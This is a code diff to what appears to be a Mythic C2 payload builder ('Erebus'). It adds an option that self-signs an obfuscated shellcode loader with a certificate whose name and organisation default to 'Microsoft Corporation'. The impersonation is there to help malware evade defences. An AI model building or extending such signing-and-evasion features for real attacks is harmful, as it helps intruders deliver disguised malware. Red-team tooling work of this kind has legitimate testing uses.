@@ -13,6 +13,7 @@ from erebus_wrapper.erebus.modules.container_clickonce import build_clickonce
 from erebus_wrapper.erebus.modules.container_msi import build_msi
 from erebus_wrapper.erebus.modules.container_archive import build_7z, build_zip
 from erebus_wrapper.erebus.modules.container_iso import build_iso
+from erebus_wrapper.erebus.modules.codesigner import self_sign_payload
 
 from mythic_container.PayloadBuilder import *
 from mythic_container.MythicCommandBase import *
@@ -321,8 +322,47 @@ generated if none have been entered.""",
             hide_conditions=[
                 HideCondition(name="Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
             ]
-        )
+        ),
 
+        BuildParameter(
+            name="Codesign Loader",
+            parameter_type=BuildParameterType.Boolean,
+            description="Sign the loader with a codesigning cert",
+            required=False,
+        ),
+
+        BuildParameter(
+            name="Codesign Type",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Backdoor an existing ISO",
+            choices=["SelfSign", "Provide Certificate"],
+            required=False,
+            hide_conditions=[
+                HideCondition(name="Codesign Loader", operand=HideConditionOperand.EQ, value=False)
+            ]
+        ),
+
+        BuildParameter(
+            name="Codesign CN",
+            parameter_type=BuildParameterType.String,
+            default_value="Microsoft Corporation",
+            description="Common Name (CN) for self-signed cert",
+            hide_conditions=[
+                HideCondition(name="Codesign Loader", operand=HideConditionOperand.EQ, value=False),
+                HideCondition(name="Codesign Type", operand=HideConditionOperand.NotEQ, value="SelfSign")
+            ]
+        ),
+
+        BuildParameter(
+            name="Codesign Orgname",
+            parameter_type=BuildParameterType.String,
+            default_value="Microsoft Corporation",
+            description="Organisation Name for self-signed cert",
+            hide_conditions=[
+                HideCondition(name="Codesign Loader", operand=HideConditionOperand.EQ, value=False),
+                HideCondition(name="Codesign Type", operand=HideConditionOperand.NotEQ, value="SelfSign")
+            ]
+        ),
     ]
 
     build_steps = [
@@ -343,6 +383,9 @@ generated if none have been entered.""",
 
         BuildStep(step_name = "Compiling Shellcode Loader",
             step_description = "Compiling Shellcode Loader with Obfuscated Raw Agent Shellcode"),
+        
+        BuildStep(step_name = "Signing Shellcode Loader",
+            step_description = "Signing the Shellcode Loader with a code signing certificate"),
 
         BuildStep(step_name = "Adding Trigger",
                   step_description = "Creating trigger to execute given payload"),
@@ -824,6 +867,54 @@ generated if none have been entered.""",
                 output = ""
             ######################### End Of Shellcode Loader Section #########################
 
+            ######################### Code Signing Section #########################
+            if self.get_parameter("Codesign Loader"):
+                try:
+                    payload_path = Path(agent_build_path) / "payload" / "erebus.exe"
+
+                    if not payload_path.exists():
+                        raise FileNotFoundError(f"Payload not found for signing at: {payload_path}")
+
+                    signing_type = self.get_parameter("Codesign Type")
+
+                    cn= self.get_parameter("Codesign CN")
+                    if signing_type == "SelfSign":
+                        self_sign_payload(
+                            payload_path=payload_path,
+                            subject_cn=cn,
+                            org_name=self.get_parameter("Codesign Orgname"),
+                            build_path=Path(agent_build_path)
+                        )
+                        success_msg = f"Self-signed with CN: {cn}"
+
+                    elif signing_type == "Provide Certificate":
+
+                        raise NotImplementedError("Provide Certificate mode not yet implemented in backend")
+
+                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                        PayloadUUID=self.uuid,
+                        StepName="Code Signing",
+                        StepStdout=f"Success: {success_msg}",
+                        StepSuccess=True
+                    ))
+
+                except Exception as e:
+                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                        PayloadUUID=self.uuid,
+                        StepName="Code Signing",
+                        StepStdout=f"Signing Failed: {str(e)}",
+                        StepSuccess=False
+                    ))
+                    response.status = BuildStatus.Error
+                    response.build_stderr = f"Code signing failed: {str(e)}"
+                    return response
+            else:
+                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                    PayloadUUID=self.uuid,
+                    StepName="Code Signing",
+                    StepStdout="Skipped (Not Enabled)",
+                    StepSuccess=True
+                ))
             ######################### Final Payload / Container #########################
 
             # 1. Capture context for container function
